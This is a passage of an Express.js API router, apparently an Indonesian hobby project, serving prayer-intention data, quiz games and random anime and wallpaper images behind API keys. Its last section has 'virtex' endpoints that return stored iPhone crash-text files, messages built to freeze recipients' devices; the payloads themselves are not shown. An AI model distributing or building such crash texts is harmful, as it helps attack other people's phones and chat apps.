    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/NiatShubuh.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatzuhur', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/NiatDzuhur.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatmagrib', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/NiatMaghrib.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatisya', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/main/data/NiatIsya.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatashar', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/NiatAshar.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Game  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/game/asahotak', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.asahotak()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/caklontong', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.caklontong()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/family100', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.family100()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/siapakahaku', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.siapakahaku()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/susunkata', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.susunkata()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakbendera', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebakbendera()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakgambar', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebakgambar()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakkabupaten', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebakkabupaten()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakkata', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebakkata()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakkimia', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebakkimia()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebaklirik', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebaklirik()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebaktebakan', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tebaktebakan()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'Zeltoria',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tekateki', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        scr.tekateki()
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/game/tebakkalimat', async (req, res, next) => {
    var apikey = req.query.apikey

    if(!apikey) return res.json(loghandler.noapikey)
    if(listkey.includes(apikey)){
        var soal = JSON.parse(
            fs.readFileSync(__path + '/database/tebakkalimat.json')
        )
        res.json({
              status: true,
              creator: 'Zeltoria',
              ...soal[~~(Math.random() * soal.length)]
          })
    } else {
        res.json(loghandler.error)
    }
})

router.get('/game/tebakkata', async (req, res, next) => {
    var apikey = req.query.apikey

    if(!apikey) return res.json(loghandler.noapikey)
    if(listkey.includes(apikey)){
        var soal = JSON.parse(
            fs.readFileSync(__path + '/database/tebakkata.json')
        )
        res.json({
              status: true,
              creator: 'Zeltoria',
              ...soal[~~(Math.random() * soal.length)]
          })
    } else {
        res.json(loghandler.error)
    }
})

router.get('/game/tebakjenaka', async (req, res, next) => {
    var apikey = req.query.apikey

    if(!apikey) return res.json(loghandler.noapikey)
    if(listkey.includes(apikey)){
        var pertanyaan = JSON.parse(
            fs.readFileSync(__path + '/database/tebakjenaka.json')
        )
        res.json({
              status: true,
              creator: 'Zeltoria',
              ...pertanyaan[~~(Math.random() * pertanyaan.length)]
          })
    } else {
        res.json(loghandler.error)
    }
})
router.get('/game/tebakchara', async (req, res, next) => {
    var apikey = req.query.apikey

    if(!apikey) return res.json(loghandler.noapikey)
    if(listkey.includes(apikey)){
        var name = JSON.parse(
            fs.readFileSync(__path + '/database/tebakchara.json')
        )
        res.json({
              status: true,
              creator: 'Zeltoria',
              ...name[~~(Math.random() * name.length)]
          })
    } else {
        res.json(loghandler.error)
    }
})
//―――――――――――――――――――――――――――――――――――――――――― ┏  Random  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/random/satanic', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const satanic = JSON.parse(fs.readFileSync(__path + '/database/satanic.json'));
        const randsatanic = satanic[Math.floor(Math.random() * satanic.length)];
        data = await fetch(randsatanic).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/satanic.jpeg', data)
        res.sendFile(__path + '/tmp/satanic.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/cyberspace', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const cyberspace = JSON.parse(fs.readFileSync(__path + '/database/CyberSpace.json'));
        const randcyberspace = cyberspace[Math.floor(Math.random() * cyberspace.length)];
        data = await fetch(randcyberspace).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/cyberspace.jpeg', data)
        res.sendFile(__path + '/tmp/cyberspace.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/hacker', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        Hekel = JSON.parse(fs.readFileSync(__path + '/database/hekel.json'));
        const randHekel = Hekel[Math.floor(Math.random() * Hekel.length)]
        data = await fetch(randHekel).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/hek.jpeg', data)
        res.sendFile(__path + '/tmp/hek.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/gaming', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const gaming = JSON.parse(fs.readFileSync(__path + '/database/GameWallp.json'));
        const randgaming = gaming[Math.floor(Math.random() * gaming.length)];
        data = await fetch(randgaming).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/gaming.jpeg', data)
        res.sendFile(__path + '/tmp/gaming.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/islami', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const islami = JSON.parse(fs.readFileSync(__path + '/database/Islamic.json'));
        const randislami = islami[Math.floor(Math.random() * islami.length)];
        data = await fetch(randislami).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/islami.jpeg', data)
        res.sendFile(__path + '/tmp/islami.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/programing', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const programing = JSON.parse(fs.readFileSync(__path + '/database/Programming.json'));
        const randprograming = programing[Math.floor(Math.random() * programing.length)];
        data = await fetch(randprograming).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/programing.jpeg', data)
        res.sendFile(__path + '/tmp/programing.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/random/teknologi', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const teknologi = JSON.parse(fs.readFileSync(__path + '/database/Technology.json'));
        const randteknologi = teknologi[Math.floor(Math.random() * teknologi.length)];
        data = await fetch(randteknologi).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/teknologi.jpeg', data)
        res.sendFile(__path + '/tmp/teknologi.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  SFW  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/sfw/ayanokouji', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const ayanokouji = JSON.parse(fs.readFileSync(__path + '/database/ayanokouji.json'));
        const rankouji = ayanokouji[Math.floor(Math.random() * ayanokouji.length)];
        data = await fetch(rankouji).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/ayanokouji.jpeg', data)
        res.sendFile(__path + '/tmp/ayanokouji.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/elaina', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const elaina = JSON.parse(fs.readFileSync(__path + '/database/elaina.json'));
        const ranlaina = elaina[Math.floor(Math.random() * elaina.length)];
        data = await fetch(ranlaina).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/elaina.jpeg', data)
        res.sendFile(__path + '/tmp/elaina.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/ikuyo', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const ikuyo = JSON.parse(fs.readFileSync(__path + '/database/ikuyo.json'));
        const ranikuyo = ikuyo[Math.floor(Math.random() * ikuyo.length)];
        data = await fetch(ranikuyo).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/ikuyo.jpeg', data)
        res.sendFile(__path + '/tmp/ikuyo.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/chisato', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const chisato = JSON.parse(fs.readFileSync(__path + '/database/chisato.json'));
        const ranchi = chisato[Math.floor(Math.random() * chisato.length)];
        data = await fetch(ranchi).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/chisato.jpeg', data)
        res.sendFile(__path + '/tmp/chisato.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/selfies', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const selfies = JSON.parse(fs.readFileSync(__path + '/database/selfies.json'));
        const ranselfies = selfies[Math.floor(Math.random() * selfies.length)];
        data = await fetch(ranselfies).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/selfies.jpeg', data)
        res.sendFile(__path + '/tmp/selfies.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/takina', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const takina = JSON.parse(fs.readFileSync(__path + '/database/takina.json'));
        const rantaki = takina[Math.floor(Math.random() * takina.length)];
        data = await fetch(rantaki).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/takina.jpeg', data)
        res.sendFile(__path + '/tmp/takina.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/anna', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const anna = JSON.parse(fs.readFileSync(__path + '/database/anna.json'));
        const ranna = anna[Math.floor(Math.random() * anna.length)];
        data = await fetch(ranna).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/anna.jpeg', data)
        res.sendFile(__path + '/tmp/anna.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/ayuzawa', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const ayuzawa = JSON.parse(fs.readFileSync(__path + '/database/ayuzawa.json'));
        const ranayuzawa = ayuzawa[Math.floor(Math.random() * ayuzawa.length)];
        data = await fetch(ranayuzawa).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/ayuzawa.jpeg', data)
        res.sendFile(__path + '/tmp/ayuzawa.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/akira', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const akira = JSON.parse(fs.readFileSync(__path + '/database/akira.json'));
        const ranakira = akira[Math.floor(Math.random() * akira.length)];
        data = await fetch(ranakira).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/akira.jpeg', data)
        res.sendFile(__path + '/tmp/akira.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/asuna', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const asuna = JSON.parse(fs.readFileSync(__path + '/database/asuna.json'));
        const ranasuna = asuna[Math.floor(Math.random() * asuna.length)];
        data = await fetch(ranasuna).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/asuna.jpeg', data)
        res.sendFile(__path + '/tmp/asuna.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/bocchi', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const bocchi = JSON.parse(fs.readFileSync(__path + '/database/bocchi.json'));
        const ranbocchi = bocchi[Math.floor(Math.random() * bocchi.length)];
        data = await fetch(ranbocchi).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/bocchi.jpeg', data)
        res.sendFile(__path + '/tmp/bocchi.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/kaori', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const kaori = JSON.parse(fs.readFileSync(__path + '/database/kaori.json'));
        const rankaori = kaori[Math.floor(Math.random() * kaori.length)];
        data = await fetch(rankaori).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/kaori.jpeg', data)
        res.sendFile(__path + '/tmp/kaori.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/kotori', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const kotori = JSON.parse(fs.readFileSync(__path + '/database/kotori.json'));
        const rankotori = kotori[Math.floor(Math.random() * kotori.length)];
        data = await fetch(rankotori).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/kotori.jpeg', data)
        res.sendFile(__path + '/tmp/kotori.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/kaguya', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const kaguya = JSON.parse(fs.readFileSync(__path + '/database/kaguya.json'));
        const rankaguya = kaguya[Math.floor(Math.random() * kaguya.length)];
        data = await fetch(rankaguya).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/kaguya.jpeg', data)
        res.sendFile(__path + '/tmp/kaguya.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/miku', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const miku = JSON.parse(fs.readFileSync(__path + '/database/miku.json'));
        const ranmiku = miku[Math.floor(Math.random() * miku.length)];
        data = await fetch(ranmiku).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/miku.jpeg', data)
        res.sendFile(__path + '/tmp/miku.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/rias', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const rias = JSON.parse(fs.readFileSync(__path + '/database/rias.json'));
        const ranrias = rias[Math.floor(Math.random() * rias.length)];
        data = await fetch(ranrias).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/rias.jpeg', data)
        res.sendFile(__path + '/tmp/rias.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/yumeko', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const yumeko = JSON.parse(fs.readFileSync(__path + '/database/yumeko.json'));
        const ranyumeko = yumeko[Math.floor(Math.random() * yumeko.length)];
        data = await fetch(ranyumeko).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/yumeko.jpeg', data)
        res.sendFile(__path + '/tmp/yumeko.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/yotsuba', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const yotsuba = JSON.parse(fs.readFileSync(__path + '/database/yotsuba.json'));
        const randyotsuba = yotsuba[Math.floor(Math.random() * yotsuba.length)];
        data = await fetch(randyotsuba).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/yotsuba.jpeg', data)
        res.sendFile(__path + '/tmp/yotsuba.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/shinka', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const shinka = JSON.parse(fs.readFileSync(__path + '/database/shinka.json'));
        const ranshinka = shinka[Math.floor(Math.random() * shinka.length)];
        data = await fetch(ranshinka).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/shinka.jpeg', data)
        res.sendFile(__path + '/tmp/shinka.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/shina', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const shina = JSON.parse(fs.readFileSync(__path + '/database/shina.json'));
        const ranshina = shina[Math.floor(Math.random() * shina.length)];
        data = await fetch(ranshina).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/shina.jpeg', data)
        res.sendFile(__path + '/tmp/shina.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/shizuka', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const shizuka = JSON.parse(fs.readFileSync(__path + '/database/shizuka.json'));
        const ranshizuka = shizuka[Math.floor(Math.random() * shizuka.length)];
        data = await fetch(ranshizuka).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/shizuka.jpeg', data)
        res.sendFile(__path + '/tmp/shizuka.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/sasuke', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const sasuke = JSON.parse(fs.readFileSync(__path + '/database/sasuke.json'));
        const ransasuke = sasuke[Math.floor(Math.random() * sasuke.length)];
        data = await fetch(ransasuke).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/sasuke.jpeg', data)
        res.sendFile(__path + '/tmp/sasuke.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/sakura', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const sakura = JSON.parse(fs.readFileSync(__path + '/database/sakura.json'));
        const ransakura = sakura[Math.floor(Math.random() * sakura.length)];
        data = await fetch(ransakura).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/sakura.jpeg', data)
        res.sendFile(__path + '/tmp/sakura.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/shota', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const Shota = JSON.parse(fs.readFileSync(__path + '/database/shota.json'));
        const randShota = Shota[Math.floor(Math.random() * Shota.length)];
        data = await fetch(randShota).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/shota.jpeg', data)
        res.sendFile(__path + '/tmp/shota.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/waifu2', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const Wai2 = JSON.parse(fs.readFileSync(__path + '/database/waifu2.json'));
        const randWai2 = Wai2[Math.floor(Math.random() * Wai2.length)];
        data = await fetch(randWai2).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/wibu2.jpeg', data)
        res.sendFile(__path + '/tmp/wibu2.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/waifu', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const Wai = JSON.parse(fs.readFileSync(__path + '/database/waifu.json'));
        const randWai = Wai[Math.floor(Math.random() * Wai.length)];
        data = await fetch(randWai).then(v => v.buffer());
        await fs.writeFileSync(__path + '/tmp/wibu.jpeg', data)
        res.sendFile(__path + '/tmp/wibu.jpeg');
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/cosplay', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const cosplay = JSON.parse(fs.readFileSync(__path + '/database/cosplay.json'));
        const randcosplay = cosplay[Math.floor(Math.random() * cosplay.length)];
        data = await fetch(randcosplay).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/cosplay.jpeg', data)
        res.sendFile(__path + '/tmp/cosplay.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/sfw/loli', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const Loli = JSON.parse(fs.readFileSync(__path + '/database/loli.json'))
        const randLoli = Loli[Math.floor(Math.random() * Loli.length)]
        data = await fetch(randLoli).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/loli.jpeg', data)
        res.sendFile(__path + '/tmp/loli.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  virtex  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/virtex/iphone', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/iphone1', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone1.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/iphone2', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone2.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/virtex/iphone3', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        let inivirtex = fs.readFileSync('./virtex/iphone3.js')
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${inivirtex}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
